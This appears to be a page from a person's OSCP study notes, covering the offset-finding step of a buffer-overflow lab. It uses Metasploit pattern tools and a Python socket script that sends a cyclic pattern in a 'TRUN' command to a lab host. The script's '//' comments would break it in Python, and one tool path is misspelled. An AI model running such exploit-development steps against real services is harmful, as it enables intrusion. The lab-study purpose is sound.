---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/buffer-overflow/bof-tcm/3-finding-offset
---

# 3- Finding Offset

**Finding the Offset:** Find out what point we did break it. We want to find something called the offset.

```
Tools: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
```

* -l represent the length
* 2500 is the value that program crashed around that

We need to spare around **400 bytes** for our shellcode.&#x20;

<figure><img src="../../../../../../.gitbook/assets/image (609).png" alt=""><figcaption></figcaption></figure>

Then we have to build up another python script that include the **pattern\_create** value.

{% code title="2-offset.py" %}
```python
//python3 2-offset.py

#!/usr/bin/python3

import sys, socket
from time import sleep

//Change This offset value
offset = ""

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	//Change This IP address and Port
	s.connect(('192.168.30.131',9999))

	payload = "TRUN /.:/" + offset

	s.send((payload.encode()))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```
{% endcode %}

<figure><img src="../../../../../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>

We run the **offset.py** payload and noticed that there is no error.

But we noticed that, on Immunity Debug blink and Access Violation. The EAX was filled up with the character that we generate from metasploit.

One more thing, We found that on EIP value **"386F4337"**.

<figure><img src="../../../../../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

With the help of metasploit, we can use one more tool,

```
/urs/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
```

* -l represent the length
* -q to query the exact place that we can control the EIP

<figure><img src="../../../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

